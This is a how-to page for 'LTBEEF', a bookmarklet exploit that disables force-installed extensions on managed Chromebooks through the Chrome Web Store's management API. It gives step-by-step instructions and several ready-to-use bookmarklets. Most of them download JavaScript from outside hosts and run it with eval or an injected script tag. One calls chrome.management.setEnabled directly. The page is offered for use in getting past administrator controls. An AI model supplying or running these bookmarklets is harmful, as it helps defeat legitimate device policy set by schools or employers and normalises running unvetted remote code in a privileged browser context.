---
title: ltbeef-disable-extensions
---

-e 
Bookmarklets must not be blocked by policy to perform this exploit.
NOTE: This is patched in new versions of ChromeOS

LTBEEF (Literally The Best Exploit Ever Found) can disable extensions that are force-installed. 
Using the Chrome Management API, it is run on chrome.google.com/webstorex to utilise the Chrome Web Store's privileges in Chrome.

1. Copy the Javascript code from one of the bookmarklets below.
2. Make a new bookmark on your Chromebook.
3. Put the Javascript code in the URL section of the bookmark.
4. Visit https://chrome.google.com/webstorex. If it doesn't work, replace the x with anything else.
5. Click on the bookmark you made.
6. Switch off the extensions you don't want to have anymore with the GUI.
7. You're done! The extension should now be disabled.

CompactCow GUI:
javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});

javascript: fetch("https://compactcow.com/ltbeef/exploit.js").then((data) => {
  data.text().then((text) => {
    eval(text);
  });
});

CompactCow GUI (Dark):
javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);

Ingot GUI:
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())

Basic (no GUI):
javascript: prompt("Extension IDs here: (seperated by commas)")
  .split(",")
  .forEach((i) => {
    chrome.management.setEnabled(i.trim(), !1);
  });

Credits:
Bypassi#7037 - Exploit
CompactCow#4717 - New UI (https://compactcow.com/ltbeef)
Nebelung#1335	- Ingot (https://fognetwork.github.io/Ingot/)

CompactCow GUI Source - https://compactcow.com/ltbeef/exploit.js